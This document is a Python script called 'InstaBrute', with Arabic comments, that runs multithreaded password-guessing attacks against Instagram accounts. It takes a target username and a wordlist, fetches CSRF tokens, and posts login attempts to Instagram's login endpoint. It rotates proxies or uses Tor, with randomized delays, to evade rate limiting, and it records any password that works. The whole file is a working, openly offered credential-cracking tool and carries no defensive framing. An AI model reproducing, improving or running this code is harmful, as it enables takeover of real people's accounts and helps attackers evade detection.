#!/usr/bin/env python3
"""
InstaBrute - نسخة متطورة (جميع التعديلات 1-9) - تم إصلاح الخطأ
"""

import requests
import time
import threading
import argparse
import random
import sys
from queue import Queue
from datetime import datetime

# ===== التعديلات الأساسية =====
BASE_URL = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_DELAY = 0.5
DEFAULT_THREADS = 10
OUTPUT_FILE = "results.txt"

class InstaBruteAdvanced:
    def __init__(self, username, password_list, threads=DEFAULT_THREADS,
                 proxy_file=None, use_tor=False, output=OUTPUT_FILE,
                 delay=DEFAULT_DELAY, random_delay=False):
        self.username = username
        self.password_list = password_list
        self.threads = threads
        self.proxy_file = proxy_file
        self.use_tor = use_tor
        self.output = output
        self.delay = delay
        self.random_delay = random_delay
        self.queue = Queue()
        self.found = False
        self.lock = threading.Lock()
        self.proxies = []
        self.results = []

        if proxy_file:
            try:
                with open(proxy_file, 'r') as f:
                    for line in f:
                        p = line.strip()
                        if p:
                            self.proxies.append(p)
                print(f"[*] تم تحميل {len(self.proxies)} بروكسي")
            except:
                print("[!] فشل تحميل البروكسيات، استمرار بدونها")

    def get_proxy(self):
        if self.use_tor:
            return {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
        if self.proxies:
            p = random.choice(self.proxies)
            return {'http': p, 'https': p}
        return None

    def load_passwords(self):
        try:
            with open(self.password_list, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    self.queue.put(line.strip())
            print(f"[*] تم تحميل {self.queue.qsize()} كلمة مرور")
        except FileNotFoundError:
            print(f"[!] ملف كلمات المرور غير موجود: {self.password_list}")
            sys.exit(1)

    def get_csrf_token(self):
        session = requests.Session()
        session.headers.update({'User-Agent': USER_AGENT})
        try:
            resp = session.get('https://www.instagram.com/', proxies=self.get_proxy(), timeout=10)
            for cookie in session.cookies:
                if cookie.name == 'csrftoken':
                    return cookie.value
        except:
            pass
        return None

    def try_login(self, password):
        if self.found:
            return

        csrf = self.get_csrf_token()
        if not csrf:
            with self.lock:
                print(f"[!] فشل في الحصول على CSRF لـ {password}")
            return

        session = requests.Session()
        session.headers.update({
            'User-Agent': USER_AGENT,
            'X-CSRFToken': csrf,
            'Referer': 'https://www.instagram.com/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        session.cookies.set('csrftoken', csrf)

        data = {
            'username': self.username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }

        try:
            resp = session.post(BASE_URL, data=data, proxies=self.get_proxy(), timeout=10)
            result = resp.json()
            if result.get('authenticated'):
                with self.lock:
                    msg = f"\n[✔] ✅ نجاح! كلمة المرور: {password}"
                    print(msg)
                    self.results.append(msg)
                    self.found = True
            elif 'checkpoint_required' in str(result) or 'challenge' in str(result):
                with self.lock:
                    msg = f"[!] ⚠️ تحقق إضافي مطلوب لـ {password}"
                    print(msg)
                    self.results.append(msg)
            else:
                with self.lock:
                    msg = f"[-] ✖ فشل: {password}"
                    print(msg)
                    self.results.append(msg)
        except Exception as e:
            with self.lock:
                msg = f"[!] خطأ في الاتصال: {e}"
                print(msg)
                self.results.append(msg)

    def worker(self):
        while not self.queue.empty() and not self.found:
            pwd = self.queue.get()
            self.try_login(pwd)
            if self.random_delay:
                delay = random.uniform(self.delay * 0.5, self.delay * 1.5)
            else:
                delay = self.delay
            time.sleep(delay)

    def save_results(self):
        if self.results:
            with open(self.output, 'a') as f:
                f.write(f"===== نتائج {datetime.now()} =====\n")
                f.write("\n".join(self.results))
                f.write("\n\n")
            print(f"[*] تم حفظ النتائج في {self.output}")

    def run(self):
        print(f"[*] بدء الهجوم على {self.username}")
        print(f"[*] عدد الخيوط: {self.threads}")
        print(f"[*] التأخير: {self.delay} ثانية" + (" (عشوائي)" if self.random_delay else ""))
        if self.use_tor:
            print("[*] استخدام Tor (SOCKS5)")
        self.load_passwords()

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if not self.found:
            print("[✘] لم يتم العثور على كلمة مرور صحيحة.")

        self.save_results()

def main():
    # إصلاح: وضع global هنا قبل أي تعيين
    global BASE_URL, USER_AGENT

    parser = argparse.ArgumentParser(description="InstaBrute - متطور")
    parser.add_argument("--username", required=True, help="اسم المستخدم المستهدف")
    parser.add_argument("--password-list", required=True, help="مسار ملف كلمات المرور")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="عدد الخيوط")
    parser.add_argument("--proxy-file", help="ملف يحتوي على بروكسيات (سطر لكل بروكسي)")
    parser.add_argument("--tor", action="store_true", help="استخدام Tor (يتطلب تشغيل Tor)")
    parser.add_argument("--output", default=OUTPUT_FILE, help="ملف حفظ النتائج")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="التأخير بين المحاولات (ثانية)")
    parser.add_argument("--random-delay", action="store_true", help="تفعيل التأخير العشوائي")
    parser.add_argument("--user-agent", default=USER_AGENT, help="تخصيص User-Agent")
    parser.add_argument("--api-url", default=BASE_URL, help="تخصيص رابط API")

    args = parser.parse_args()

    # تعيين القيم العالمية بعد التصريح بـ global
    BASE_URL = args.api_url
    USER_AGENT = args.user_agent

    brute = InstaBruteAdvanced(
        username=args.username,
        password_list=args.password_list,
        threads=args.threads,
        proxy_file=args.proxy_file,
        use_tor=args.tor,
        output=args.output,
        delay=args.delay,
        random_delay=args.random_delay
    )

    brute.run()

if __name__ == "__main__":
    main()
